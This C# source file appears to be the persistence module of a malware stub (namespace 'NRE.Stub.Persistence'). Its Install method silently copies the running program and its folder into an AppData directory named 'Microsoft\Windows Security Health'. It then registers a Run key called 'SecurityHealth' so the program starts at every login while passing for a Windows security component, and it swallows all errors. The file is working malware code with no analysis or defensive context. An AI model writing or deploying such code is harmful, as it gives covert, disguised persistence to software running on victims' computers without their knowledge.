using System;
using System.IO;
using Microsoft.Win32;

namespace NRE.Stub.Persistence
{
    /// <summary>
    /// Copies current process exe and its directory to AppData and adds HKCU Run key for startup.
    /// </summary>
    public static class StartupInstall
    {
        private const string RunKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

        public static void Install()
        {
            try
            {
                string currentExe = System.Reflection.Assembly.GetEntryAssembly()?.Location;
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe))
                    return;
                string currentDir = Path.GetDirectoryName(currentExe);
                if (string.IsNullOrEmpty(currentDir))
                    return;

                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string folderName = "Microsoft\\Windows Security Health";
                string installDir = Path.Combine(appData, folderName);
                Directory.CreateDirectory(installDir);

                string exeName = Path.GetFileName(currentExe);
                string destExe = Path.Combine(installDir, exeName);
                if (string.Equals(currentExe, destExe, StringComparison.OrdinalIgnoreCase))
                    return;

                foreach (var file in Directory.GetFiles(currentDir))
                {
                    string name = Path.GetFileName(file);
                    string dest = Path.Combine(installDir, name);
                    try
                    {
                        File.Copy(file, dest, true);
                    }
                    catch { }
                }

                string runValue = "\"" + destExe + "\"";
                using (var key = Registry.CurrentUser.CreateSubKey(RunKeyPath))
                {
                    if (key != null)
                        key.SetValue("SecurityHealth", runValue, RegistryValueKind.String);
                }
            }
            catch { }
        }
    }
}
